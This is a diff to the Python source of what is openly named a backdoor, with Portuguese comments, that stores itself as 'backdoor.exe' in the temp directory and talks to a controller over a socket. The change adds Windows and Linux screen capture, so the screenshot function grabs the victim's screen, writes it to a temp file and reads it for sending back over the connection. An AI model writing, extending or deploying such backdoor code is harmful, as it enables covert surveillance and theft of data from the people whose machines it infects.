@@ -9,12 +9,19 @@ import os
 import time
 import subprocess
 import tempfile
-try:
-    import pyscreenshot
-except:
-    pass
 import random
 import threading
+if(os.name == 'posix'):
+    try:
+        import pyscreenshot
+    except ImportError:
+        pass
+elif(os.name == 'nt'):
+    try:
+        import ImageGrab
+    except ImportError:
+        pass
+
 
 nome_arquivo='backdoor.exe'
 TEMPDIR = tempfile.gettempdir() # diretório temporario do windows, onde será salvo o backdoor
@@ -64,9 +71,14 @@ def run_program(s , nome_programa):
 
 
 def screenshot(s):
-    img = pyscreenshot.grab()
     nome = TEMPDIR + '/screenshot'+str(random.randint(0,1000000)) + '.png'
-    img.save(nome)
+    if(os.name == 'posix'):
+        img = pyscreenshot.grab()
+        img.save(nome)
+    elif(os.name == 'nt'):
+        img = ImageGrab.grab()
+        img.save(nome)
+        
     f = open(nome ,'rb')
     l = f.read(1024)
     l = nome + '+/-' + l
